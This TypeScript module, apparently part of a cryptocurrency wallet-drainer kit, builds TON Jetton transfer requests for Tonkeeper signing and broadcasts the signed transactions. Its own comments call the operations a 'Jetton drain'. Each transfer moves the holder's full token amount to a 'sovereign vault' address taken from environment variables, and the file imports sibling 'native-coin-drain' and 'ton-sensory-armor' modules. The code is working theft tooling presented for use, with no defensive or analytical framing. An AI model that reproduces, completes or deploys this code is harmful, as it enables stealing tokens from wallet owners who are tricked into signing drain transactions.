/**
 * TON Jetton drain — transfer message for Tonkeeper signing + BOC relay broadcast.
 */
import { Address, beginCell, toNano } from '@ton/core'
import { JettonMaster, TonClient } from '@ton/ton'

import { resolveTonCenterJsonRpcUrl, tonCenterApiHeaders } from './ton-sensory-armor.js'
import { parseNativeAmount } from './native-coin-drain.js'
import { broadcastSignedTonNativeTransfer } from './ton-native-drain.js'

export type JettonTransferRequest = {
  from: string
  to: string
  jettonMaster: string
  jettonWallet: string
  amount: string
  validUntil: number
  messages: Array<{ address: string; amount: string; payload?: string }>
  wallet: 'tonkeeper'
}

function resolveTonVaultAddress(): string | null {
  const raw =
    (typeof process !== 'undefined' ? process.env['VAULT_ADDRESS_TON'] : undefined)?.trim() ||
    (typeof process !== 'undefined' ? process.env['SOVEREIGN_VAULT_TON'] : undefined)?.trim() ||
    ''
  return raw || null
}

function createTonClient(endpoint: string): TonClient {
  const apiKey = tonCenterApiHeaders()?.['X-API-Key']
  return new TonClient({
    endpoint,
    ...(apiKey ? { apiKey } : {}),
  })
}

function buildJettonTransferBody(params: {
  amount: bigint
  destination: Address
  responseDestination: Address
  forwardTonAmount?: bigint
}): string {
  const body = beginCell()
    .storeUint(0xf8a7ea5, 32)
    .storeUint(0, 64)
    .storeCoins(params.amount)
    .storeAddress(params.destination)
    .storeAddress(params.responseDestination)
    .storeBit(0)
    .storeCoins(params.forwardTonAmount ?? 0n)
    .storeBit(0)
    .endCell()
  return body.toBoc().toString('base64')
}

/**
 * Build Jetton transfer parameters for Tonkeeper wallet signing.
 */
export async function buildJettonTransferTx(
  wallet: string,
  to: string,
  jettonMaster: string,
  amount: bigint,
  rpcUrl?: string,
): Promise<JettonTransferRequest> {
  if (amount <= 0n) {
    throw new Error('Jetton transfer amount must be greater than zero')
  }

  const endpoint = rpcUrl?.trim() || resolveTonCenterJsonRpcUrl()
  const client = createTonClient(endpoint)
  const owner = Address.parse(wallet)
  const destinationOwner = Address.parse(to)
  const master = client.open(JettonMaster.create(Address.parse(jettonMaster)))
  const jettonWalletContract = await master.getWalletAddress(owner)
  const jettonWallet = jettonWalletContract.toString({ bounceable: true, urlSafe: true })

  const payload = buildJettonTransferBody({
    amount,
    destination: destinationOwner,
    responseDestination: owner,
    forwardTonAmount: toNano('0.01'),
  })

  const validUntil = Math.floor(Date.now() / 1000) + 600
  const gas = toNano('0.05')

  return {
    from: wallet,
    to,
    jettonMaster,
    jettonWallet,
    amount: amount.toString(),
    validUntil,
    messages: [
      {
        address: jettonWallet,
        amount: gas.toString(),
        payload,
      },
    ],
    wallet: 'tonkeeper',
  }
}

/** Build Jetton drain plan using configured sovereign vault destination. */
export async function buildJettonDrainForBatch(params: {
  wallet: string
  jettonMaster: string
  amount: bigint
  vault?: string
  rpcUrl?: string
}): Promise<JettonTransferRequest | null> {
  if (params.amount <= 0n) return null
  const vault = params.vault ?? resolveTonVaultAddress()
  if (!vault) {
    throw new Error('VAULT_ADDRESS_TON or SOVEREIGN_VAULT_TON required for Jetton drain')
  }
  return buildJettonTransferTx(params.wallet, vault, params.jettonMaster, params.amount, params.rpcUrl)
}

/** Broadcast wallet-signed Jetton transfer BOC. */
export async function executeJettonDrain(params: {
  bocBase64: string
  rpcUrl?: string
}): Promise<{ ok: boolean; tx_hash?: string; detail?: string }> {
  return broadcastSignedTonNativeTransfer({
    bocBase64: params.bocBase64,
    rpcUrl: params.rpcUrl,
  })
}

export { parseNativeAmount as parseJettonAmount }
